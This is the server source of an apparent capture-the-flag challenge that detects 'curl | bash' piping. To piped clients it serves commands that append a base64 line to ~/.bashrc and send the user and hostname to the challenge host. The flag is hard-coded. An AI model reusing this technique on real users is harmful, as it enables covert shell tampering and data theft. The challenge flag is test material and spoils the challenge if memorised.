"use strict;"
// Modules
const fs	= require('fs');
const https	= require('https');
const express	= require('express');
const uuidv4	= require('uuid/v4');
const chalk	= require('chalk');

// Constants
const PORT		= process.env.PORT || 8443;
const HOST		= process.env.HOST || '0.0.0.0';
const URL		= 'https://curlpipebash.teaser.insomnihack.ch';
const SCRIPT_PATH	= '/print-flag.sh';
const SHAME_PATH	= '/add-to-wall-of-shame';
const FLAG		= 'INS{Miss me with that fishy pipe}';
const SHAME		= 'echo "Welcome to the wall of shame!"\n'
const TIMEOUT_MS	= 1000;
const states		= Object.freeze({
	WAITING	: 'waiting',
	PIPED	: 'piped',
	PWNED	: 'pwned'
});
const app		= express();
const privateKey	= fs.readFileSync('/etc/letsencrypt/live/curlpipebash.teaser.insomnihack.ch/privkey.pem','utf8');
const certificate	= fs.readFileSync('/etc/letsencrypt/live/curlpipebash.teaser.insomnihack.ch/fullchain.pem','utf8');
const credentials = {key: privateKey, cert: certificate};
const httpsServer = https.createServer(credentials, app);

// Global variable
let sessions = {};

// Handler for the main script
app.get(SCRIPT_PATH, async (req, res) => {
	
	let source = req.connection.remoteAddress;

	// Write a curl command piped to bash
	let sessionToken = newSession();
  
	log(source, sessionToken, 'Created new session');
	res.write("curl -Ns " + URL + "/" + sessionToken + " | bash\n");

	// Wait for a bit
	await snooze(TIMEOUT_MS);

	// If the command was piped in bash, try to pwn
	if(sessions[sessionToken] === states.PIPED) {
		log(source, sessionToken, chalk.red('Sending pwn'));
		res.write("base64  -d >> ~/.bashrc <<< ZXhwb3J0IFBST01QVF9DT01NQU5EPSdlY2hvIFRIQU5LIFlPVSBGT1IgUExBWUlORyBJTlNPTU5JSEFDSyBURUFTRVIgMjAxOScK\n");
		res.write("curl -Ns " + URL + "/" + sessionToken + SHAME_PATH + '/$(whoami)%40$(hostname)\n');
	} else {
		log(source, sessionToken, chalk.green('Not piped in bash'));
		res.end();
		return;
	}
	
	// Wait for a bit
	await snooze(TIMEOUT_MS);

	// If the victim was pwned, shame, otherwise congrats!
	if(sessions[sessionToken] === states.PWNED) {
		res.write(SHAME);
	} else {
		log(source, sessionToken, chalk.bgGreen('CONGRATS!'));
		res.write(FLAG);
	}
	res.end();

})

// Handler a session
app.get('/:sessionToken', async (req, res) => {
	
	let sessionToken = req.params.sessionToken;
	let source = req.connection.remoteAddress;
	let useragent = req.get('User-Agent');
	log(source,sessionToken,useragent);
	
	// If the session valid, update its state to PIPED
	if(useragent.startsWith('curl') && sessions[sessionToken] === states.WAITING) {
		log(source, sessionToken, chalk.red('Piped'));
		sessions[sessionToken] = states.PIPED;
	} else {
		log(source, sessionToken, chalk.green('Invalid session or UA'));
		res.write("curl -Ns " + URL + SCRIPT_PATH + " | bash\n");
	}
	res.end();
	return;
});

// Handler for the wall of shame
app.get('/:sessionToken' + SHAME_PATH + '/:victim', (req, res) => {
	
	let sessionToken = req.params.sessionToken;
	let source = req.connection.remoteAddress;
	
	// If the session is valid, add an entry to the wall of shame
	if(sessions[sessionToken] === states.PIPED) {
		log(source, sessionToken, chalk.bgRed('PWNED ' + req.params.victim));
		sessions[sessionToken] = states.PWNED;
	} else {
		 log(source, sessionToken, chalk.green('Invalid shame'));
		 res.write("curl -Ns " + URL + SCRIPT_PATH + " | bash\n");
	}
	res.end();
	return;
})

function newSession() {
	// Generate a random session token
	let sessionToken = uuidv4();
	// Create a new session in the WAITING state
	sessions[sessionToken] = states.WAITING;
	// Auto-destruct the session after a timeout
	setTimeout(() => {delete sessions[sessionToken]},3*TIMEOUT_MS);
	return sessionToken;
}

function snooze(ms) {
	return new Promise(resolve => setTimeout(resolve,ms));
}

// Logging in stdout so that Gynvael cannot XSS
function log(source, sessionToken, msg) {
	console.log(new Date() + "\t" + source + "\t" + sessionToken + "\t" + msg);
}

// Launch the server
httpsServer.listen(PORT, HOST);

